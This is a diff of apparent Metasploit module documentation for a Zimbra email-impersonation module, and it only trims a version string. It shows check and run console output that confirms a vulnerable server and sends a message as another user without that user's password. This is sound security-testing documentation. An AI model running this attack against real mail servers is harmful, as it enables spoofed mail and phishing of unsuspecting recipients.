@@ -127,11 +127,11 @@ the selected account's password is neither known nor supplied.
 
 ```text
 msf auxiliary(admin/http/zimbra_email_impersonation) > check
-[+] <target>:443 - Appears: Authenticated <attacker> and local target <selected-sender> are confirmed on known affected 10.1.16_GA_4850 20260106145110 20260106-1508 NETWORK
+[+] <target>:443 - Appears: Authenticated <attacker> and local target <selected-sender> are confirmed on known affected 10.1.16
 
 msf auxiliary(admin/http/zimbra_email_impersonation) > run
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable. Authenticated <attacker> and local target <selected-sender> are confirmed on known affected 10.1.16_GA_4850 20260106145110 20260106-1508 NETWORK
+[+] The target appears to be vulnerable. Authenticated <attacker> and local target <selected-sender> are confirmed on known affected 10.1.16
 [*] Sending a delegated message from <selected-sender> to <attacker>
 [*] Subject: Important message [MSF-<unique-marker>]
 [+] Verified Inbox delivery from <selected-sender> to <attacker>
